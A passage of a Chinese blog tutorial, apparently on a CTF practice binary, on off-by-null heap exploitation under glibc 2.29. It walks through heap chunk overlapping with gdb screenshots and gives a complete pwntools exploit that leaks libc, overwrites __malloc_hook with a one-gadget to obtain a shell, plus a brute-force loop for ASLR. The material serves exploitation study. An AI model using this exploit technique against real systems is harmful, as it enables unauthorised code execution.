+        data-srcset="https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png, https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png 1.5x, https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png"
+        title="https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png" /></p>
+<p>此时我们分配E：0x20，F：0x100，计算一下就能得到B+0x10到F的堆块大小为0xa，现在释放F堆块就会发生堆块合并，从而造成overlapping。之后的利用就很简单了。</p>
+<p>OK，现在我们在回到最开头的那个问题。为什么要将heap的地址第二个字节提到到0x20?这是因为off by null会在输入的字符后面加0x00，比如我们在修改B堆块的fd为B+0x10时，我们修改了最低字节，但是由于off by null，其第二字节也被修改为0x00，所以只有当我们将第二个字节提高到0x00时才能成功修改。</p>
+<p>在将地址提高到第二字节为0x00时，如果开启了PIE时，最低的12位是确定的，13-16位是不确定的，因此只能爆破，成功率是1/16。在本地测试时可以先将PIE关闭，当编写出EXP后，再开启PIE，测试爆破。</p>
+<h2 id="例题-2">例题</h2>
+<p>例题还是用前面的例子，不过我们需要用patchelf将libc和ld的版本换成2.29的，方法同2.27。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ patchelf --replace-needed /glibc/2.27/amd64/lib/libc-2.27.so /glibc/2.29/amd64/lib/libc-2.29.so ./vuln
+$ patchelf --set-interpreter /glibc/2.29/amd64/lib/ld-2.29.so ./vuln
+$ ldd vuln 
+	linux-vdso.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x00007fff2afe1000<span class="o">)</span>
+	/glibc/2.29/amd64/lib/libc-2.29.so <span class="o">(</span>0x00007f6c8ff74000<span class="o">)</span>
+	/glibc/2.29/amd64/lib/ld-2.29.so <span class="o">=</span>&gt; /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f6c90530000<span class="o">)</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>按照我们的思路首先我们需要将地址提高到第二字节为0。我们这里先关闭ASLR来编写EXP。</p>
+<p>gdb观察到，第一个分配的堆块地址是0x555555758670，所以如果我们想要将堆块地址提高到0x555555760000，我们需要添加0x7990大小的chunk。这里从0x7990中拿出来7个0x30大小的chunk，用于后面填满tcache。</p>
+<p>然后我们分配一个0x500大小的chunkA，并分配一个0x20大小的chunk来分隔A和TOPchunk。A堆块分配完成后，我们再释放A，申请一个比A大的chunk，这里我们申请0x600来使A堆块进入large bin。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/cuvBZa2MLKYmOSy.png"
+        data-srcset="https://i.loli.net/2020/07/13/cuvBZa2MLKYmOSy.png, https://i.loli.net/2020/07/13/cuvBZa2MLKYmOSy.png 1.5x, https://i.loli.net/2020/07/13/cuvBZa2MLKYmOSy.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/cuvBZa2MLKYmOSy.png"
+        title="image-20200713203531506" /></p>
+<p>按照上面的思路，我们再从A堆块中分隔出BCD堆块，注意在实际应用中C，D，A堆块不能相邻，否在在申请一个较大堆块时，发生malloc_consolidate，CDA将会合并</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png"
+        data-srcset="https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png, https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png 1.5x, https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png"
+        title="https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png" /></p>
+<p>这里把B堆块的bk和fd_size改成consolidate_size和C堆块的地址。consolidate_size是根据后面需要合并的堆块大小计算出来的，在这里可以先不写出，待后面分配完了后再修改。</p>
+<p>然后我们用前面准备的7个0x30大小的chunk填满tcache，再释放C和D，并申请一个大的chunk使得C和D进入small bin。注意这里为了防止D堆块和A堆块合并，我们在申请一个大的对快前，提前将E堆块申请了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/nJQSpx5X7Ih4MoL.png"
+        data-srcset="https://i.loli.net/2020/07/13/nJQSpx5X7Ih4MoL.png, https://i.loli.net/2020/07/13/nJQSpx5X7Ih4MoL.png 1.5x, https://i.loli.net/2020/07/13/nJQSpx5X7Ih4MoL.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/nJQSpx5X7Ih4MoL.png"
+        title="image-20200713205519924" /></p>
+<p>然后我们申请出C堆块，将bk修改为B+0x10.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png"
+        data-srcset="https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png, https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png 1.5x, https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png"
+        title="https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png" /></p>
+<p>下一步我们将B堆块和D堆块放入fast bin中然后修改B堆块的fd为B+0x10</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png"
+        data-srcset="https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png, https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png 1.5x, https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png"
+        title="https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png" /></p>
+<p>到这里我们就完成了堆块的构造，后面就很简单了，我们再从A堆块中分割出E和F，然后用E来修改F的prev_size和in_use。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/FWi8CUIBwnbm42J.png"
+        data-srcset="https://i.loli.net/2020/07/13/FWi8CUIBwnbm42J.png, https://i.loli.net/2020/07/13/FWi8CUIBwnbm42J.png 1.5x, https://i.loli.net/2020/07/13/FWi8CUIBwnbm42J.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/FWi8CUIBwnbm42J.png"
+        title="image-20200713210657235" /></p>
+<p>接下来我们需要先申请7个0x100大小的chunk，来填满tcache，再释放F堆块发生堆块合并。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/NpEDGdAejMaybU4.png"
+        data-srcset="https://i.loli.net/2020/07/13/NpEDGdAejMaybU4.png, https://i.loli.net/2020/07/13/NpEDGdAejMaybU4.png 1.5x, https://i.loli.net/2020/07/13/NpEDGdAejMaybU4.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/NpEDGdAejMaybU4.png"
+        title="image-20200713211401464" /></p>
+<p>发生堆块合并后，思路就和前面一样了，这里就不再重复了，直接看EXP。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">()</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">s</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sea</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>          <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">info_addr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">tag</span><span class="p">,</span> <span class="n">addr</span>        <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">tag</span> <span class="o">+</span><span class="s1">&#39;: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">debug</span>	<span class="o">=</span> <span class="k">lambda</span> <span class="n">command</span><span class="o">=</span><span class="s1">&#39;&#39;</span>			<span class="p">:</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">full</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">full</span><span class="p">:</span>
+		<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/glibc/2.29/amd64/lib/libc-2.29.so&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<span class="c1">#1 step</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x7830</span><span class="p">)</span>
+<span class="c1">#2 step</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x4f0</span><span class="p">)</span> <span class="c1">#A</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="c1">#3 step</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x5f0</span><span class="p">)</span>
+<span class="c1">#4 and 5 step </span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span> 
+<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x30</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">full</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1">#B</span>
+<span class="c1">#6 step</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
+<span class="c1">#7 step</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">full</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="c1">#8 step</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="c1">#9 step</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">full</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">),</span><span class="n">full</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="c1">#10 step</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1">#11 step</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="c1">#get shell</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3b3ca0</span>
+<span class="n">malloc_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+<span class="n">realloc</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;realloc&#39;</span><span class="p">]</span>
+<span class="n">onegadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xdf202</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;malloc_hook&#34;</span><span class="p">,</span><span class="n">malloc_hook</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;onegadget&#34;</span><span class="p">,</span><span class="n">onegadget</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x8</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">itr</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>注意这里heap地址的第13-16位是随机的，所以如果开启了ASLR那么就需要爆破，那么就需要写一个bash脚本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 100<span class="sb">`</span>
+<span class="k">do</span>
+        python exp.py
+<span class="k">done</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="ref">REF</h1>
+<p><a href="https://www.jianshu.com/p/91fae054f922" target="_blank" rel="noopener noreffer">linux程序保护机制&amp;gcc编译选项</a></p>
+<p><a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener noreffer">glibc2.29下的off-by-null</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-07-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
